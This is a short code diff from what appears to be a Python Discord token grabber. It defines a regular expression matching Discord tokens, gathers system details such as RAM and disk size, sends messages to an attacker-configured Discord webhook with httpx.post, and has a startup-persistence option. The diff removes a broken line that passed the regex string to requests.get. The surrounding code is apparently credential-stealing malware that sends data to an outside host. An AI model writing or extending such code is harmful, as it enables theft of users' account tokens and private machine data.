@@ -103,8 +103,7 @@ r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
 Regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
-reg_req = requests.get(Regex) 
-clear_reg = r"[\w-]{24}\." + reg_req.text
+clear_reg = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 
 class Functions(object):
     @staticmethod
@@ -333,6 +332,7 @@ class initial_func(Functions):
             if self.pingtype == "@here" or self.pingtype == "here":
                 if self.regex_webhook_dsc in self.discord_webhook :
                     httpx.post(self.discord_webhook, json=ping2)
+
 
     def startup(self: str) -> str:
         if self.startupexe == "yes":
